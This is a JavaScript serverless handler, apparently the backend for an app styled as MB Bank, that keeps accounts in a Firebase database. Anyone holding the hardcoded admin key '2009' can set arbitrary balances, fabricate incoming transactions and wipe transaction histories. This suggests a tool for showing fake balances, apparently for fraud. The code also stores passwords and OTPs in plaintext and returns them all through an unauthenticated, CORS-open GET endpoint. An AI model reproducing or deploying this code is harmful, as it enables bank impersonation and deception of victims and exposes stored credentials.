/**
 * MB Bank Web & Admin Dispatch API
 * Central controller for managing accounts and beneficiaries directly on Firebase
 * Dedicated top-level folder per account: /<username>.json
 */

const FIREBASE_BASE = 'https://sfsdfsf-c4c13-default-rtdb.asia-southeast1.firebasedatabase.app';
const FIREBASE_URL = `${FIREBASE_BASE}/mbbank`;

async function getLiveAccountsMap() {
  const rawMap = {};
  let active = '';
  try {
    const [rootRes, mbRes] = await Promise.all([
      fetch(`${FIREBASE_BASE}/.json?ts=${Date.now()}`, { cache: 'no-store' }),
      fetch(`${FIREBASE_URL}.json?ts=${Date.now()}`, { cache: 'no-store' })
    ]);
    const rootData = rootRes.ok ? (await rootRes.json()) || {} : {};
    const mbData = mbRes.ok ? (await mbRes.json()) || {} : {};

    // 1. Quét các mục tài khoản độc lập tại gốc Firebase (VD: /TRI, /ABC)
    for (const [k, v] of Object.entries(rootData)) {
      if (k !== 'mbbank' && v && typeof v === 'object') {
        if (v.TK || v.username || v.STK || v.accountNumber || v.balance !== undefined || v.TIEN !== undefined || v.MK || v.password) {
          rawMap[k] = { ...v, _folder: k };
        }
      }
    }

    if (mbData.active_account) {
      active = String(mbData.active_account).trim();
    }
  } catch (e) {}

  // 3. Khử trùng lặp: nếu 2 mục có cùng STK hoặc cùng TK, chỉ giữ 1 mục duy nhất
  const map = {};
  const seenSTK = new Set();
  const seenTK = new Set();

  for (const [k, acc] of Object.entries(rawMap)) {
    const stk = String(acc.STK || acc.accountNumber || acc.stk || '').trim();
    const tk = String(acc.TK || acc.username || k).trim().toLowerCase();

    if ((stk && seenSTK.has(stk)) || (tk && seenTK.has(tk))) {
      continue;
    }
    if (stk) seenSTK.add(stk);
    if (tk) seenTK.add(tk);
    map[k] = acc;
  }

  return { accountsMap: map, activeAccount: active };
}

function resolveAccount(accountsMap, query, activeAccount) {
  if (query) {
    const q = String(query).trim();
    const qLower = q.toLowerCase();
    const qClean = q.replace(/\D/g, '');

    if (accountsMap[q]) return accountsMap[q];

    for (const [key, acc] of Object.entries(accountsMap)) {
      if (key.toLowerCase() === qLower) return acc;
    }

    for (const acc of Object.values(accountsMap)) {
      const u = String(acc.TK || acc.username || '').toLowerCase();
      if (u === qLower) return acc;
    }

    for (const acc of Object.values(accountsMap)) {
      const stk = String(acc.STK || acc.accountNumber || acc.stk || '').toLowerCase();
      if (stk === qLower) return acc;
      if (qClean && stk.replace(/\D/g, '') === qClean) return acc;
    }

    return null;
  }

  if (activeAccount && accountsMap[activeAccount]) {
    return accountsMap[activeAccount];
  }
  const keys = Object.keys(accountsMap);
  if (keys.length > 0) {
    return accountsMap[keys[0]];
  }
  return null;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  // GET: Fetch all accounts and active account from Firebase
  if (req.method === 'GET') {
    try {
      const { accountsMap, activeAccount } = await getLiveAccountsMap();
      const currentActive = resolveAccount(accountsMap, null, activeAccount) || {};
      const actualBal = typeof currentActive.balance === 'number' 
        ? currentActive.balance 
        : (typeof currentActive.TIEN === 'number' ? currentActive.TIEN : 0);
      const actualName = currentActive.customerName || currentActive.accountName || currentActive.TK || 'THÀNH VIÊN MB';
      const actualNum = currentActive.STK || currentActive.accountNumber || currentActive.stk || currentActive._folder || '';

      return res.status(200).json({
        success: true,
        code: 0,
        active_account: activeAccount,
        activeAccount: activeAccount,
        accounts: accountsMap,
        balance: actualBal,
        customerName: actualName,
        accountNumber: actualNum
      });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch (e) { body = {}; }
  }
  body = body || {};

  const adminKey = String(req.headers['x-admin-key'] || body.admin_key || body.adminKey || body.key || '').trim();
  if (adminKey !== '2009') {
    return res.status(401).json({ success: false, code: 401, message: 'Mã khóa bảo mật không chính xác' });
  }

  const action = body.action || 'save_account';

  if (action === 'verify_key') {
    return res.status(200).json({ success: true, code: 0, message: 'Xác thực thành công' });
  }

  // ACTION: SET ACTIVE ACCOUNT
  if (action === 'set_active') {
    const rawKey = body.accountNumber || body.account_number || body.stk || body.username || '';
    const accKey = String(rawKey).trim();
    if (!accKey) {
      return res.status(400).json({ success: false, code: 400, message: 'Thiếu số tài khoản / username' });
    }

    try {
      const { accountsMap } = await getLiveAccountsMap();
      const acc = resolveAccount(accountsMap, accKey, null);
      const folder = acc ? (acc._folder || acc.TK || acc.username) : accKey;

      await fetch(`${FIREBASE_URL}/active_account.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(folder)
      });

      return res.status(200).json({
        success: true,
        code: 0,
        message: `Đã kích hoạt tài khoản ${folder} làm tài khoản chính`,
        active_account: folder,
        account: acc
      });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // ACTION: UPDATE BALANCE DIRECTLY ON THIS ACCOUNT
  if (action === 'update_balance') {
    const rawKey = body.accountNumber || body.account_number || body.stk || body.username || '';
    const accKey = String(rawKey).trim();
    const newBal = Number(body.balance !== undefined ? body.balance : (body.tien !== undefined ? body.tien : body.TIEN));

    if (!accKey || !Number.isFinite(newBal) || newBal < 0) {
      return res.status(400).json({ success: false, code: 400, message: 'Tài khoản hoặc số dư không hợp lệ' });
    }

    try {
      const { accountsMap } = await getLiveAccountsMap();
      const acc = resolveAccount(accountsMap, accKey, null);
      const folder = acc ? (acc._folder || acc.TK || acc.username) : accKey;

      const patchData = {
        balance: newBal,
        TIEN: newBal,
        updatedAt: new Date().toISOString()
      };

      await fetch(`${FIREBASE_BASE}/${folder}.json`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(patchData)
      });

      return res.status(200).json({
        success: true,
        code: 0,
        message: `Đã cập nhật số dư mục tài khoản ${folder} thành ${newBal.toLocaleString('vi-VN')} VND`,
        balance: newBal,
        TIEN: newBal
      });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // ACTION: DELETE ACCOUNT
  if (action === 'delete_account') {
    const rawKey = body.accountNumber || body.account_number || body.stk || body.username || '';
    const accKey = String(rawKey).trim();
    if (!accKey) {
      return res.status(400).json({ success: false, code: 400, message: 'Thiếu số tài khoản' });
    }
    try {
      const { accountsMap, activeAccount } = await getLiveAccountsMap();
      const acc = resolveAccount(accountsMap, accKey, null);
      const folder = acc ? (acc._folder || acc.TK || acc.username) : accKey;

      await Promise.all([
        fetch(`${FIREBASE_BASE}/${folder}.json`, { method: 'DELETE' }).catch(() => {}),
        (accKey !== folder) ? fetch(`${FIREBASE_BASE}/${accKey}.json`, { method: 'DELETE' }).catch(() => {}) : Promise.resolve()
      ]);

      if (activeAccount === folder || activeAccount === accKey) {
        const remainingKeys = Object.keys(accountsMap).filter(k => k !== folder && k !== accKey);
        const nextActive = remainingKeys.length > 0 ? remainingKeys[0] : '';
        await fetch(`${FIREBASE_URL}/active_account.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(nextActive)
        }).catch(() => {});
      }

      return res.status(200).json({ success: true, code: 0, message: `Đã xóa hoàn toàn tài khoản ${folder}` });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // ACTION: CLEAR TRANSACTIONS
  if (action === 'clear_transactions') {
    const rawKey = body.accountNumber || body.account_number || body.stk || body.username || '';
    const accKey = String(rawKey).trim();
    try {
      if (accKey) {
        const { accountsMap } = await getLiveAccountsMap();
        const acc = resolveAccount(accountsMap, accKey, null);
        const folder = acc ? (acc._folder || acc.TK || acc.username) : accKey;

        await fetch(`${FIREBASE_BASE}/${folder}/transactions.json`, { method: 'DELETE' });
      }
      return res.status(200).json({ success: true, code: 0, message: 'Đã xóa toàn bộ lịch sử giao dịch' });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // DEFAULT ACTION: CREATE / SAVE ACCOUNT IN ITS OWN DEDICATED TOP-LEVEL NODE
  const username = String(body.username || body.tk || body.TK || body.accountNumber || body.stk || '').trim();
  const stk = String(body.stk || body.STK || body.accountNumber || body.account_number || username).trim();
  const password = String(body.password || body.mk || body.MK || body.mat_khau || '123456').trim();
  const otp = String(body.otp || body.OTP || body.ma_otp || '111111').trim();
  const name = String(body.customerName || body.accountName || body.name || username || 'THÀNH VIÊN MB').trim().toUpperCase();
  const phone = String(body.phone || body.sdt || stk || username).trim();
  const bal = Number.isFinite(Number(body.balance !== undefined ? body.balance : (body.tien !== undefined ? body.tien : body.TIEN))) 
    ? Number(body.balance !== undefined ? body.balance : (body.tien !== undefined ? body.tien : body.TIEN)) 
    : 0;
  const tier = body.tier || 'MB Priority Digital';
  const setActive = body.set_active !== false;

  const nodeKey = username || stk;
  if (!nodeKey) {
    return res.status(400).json({ success: false, code: 400, message: 'Vui lòng nhập tài khoản hoặc số tài khoản' });
  }

  try {
    const accountRecord = {
      TK: username || nodeKey,
      MK: password,
      OTP: otp,
      TIEN: bal,
      STK: stk || nodeKey,
      username: username || nodeKey,
      accountNumber: stk || nodeKey,
      stk: stk || nodeKey,
      password: password,
      otp: otp,
      phone: phone,
      sdt: phone,
      accountName: name,
      customerName: name,
      fullName: name,
      balance: bal,
      tier: tier,
      bankCode: 'MB',
      transactions: {
        [`TXN-INIT-${nodeKey}`]: {
          id: `TXN-INIT-${nodeKey}`,
          accountNumber: stk || nodeKey,
          amount: bal,
          balance: bal,
          type: 'IN',
          description: `Khoi tao so du ban dau: +${bal.toLocaleString('vi-VN')} VND`,
          createdAt: new Date().toISOString()
        }
      },
      updatedAt: new Date().toISOString()
    };

    // TẠO MỤC RIÊNG VỚI TÊN TÀI KHOẢN ĐÓ NGAY GỐC FIREBASE: /<nodeKey>.json (Ví dụ: /TRI.json)
    await fetch(`${FIREBASE_BASE}/${nodeKey}.json`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(accountRecord)
    });

    if (setActive) {
      await fetch(`${FIREBASE_URL}/active_account.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(nodeKey)
      });
    }

    return res.status(200).json({
      success: true,
      code: 0,
      status: 'success',
      message: `Đã tạo mục riêng cho tài khoản [${nodeKey}] thành công. Số dư: ${bal.toLocaleString('vi-VN')} VND`,
      data: accountRecord
    });
  } catch (err) {
    return res.status(500).json({ success: false, code: 500, error: err.message });
  }
}
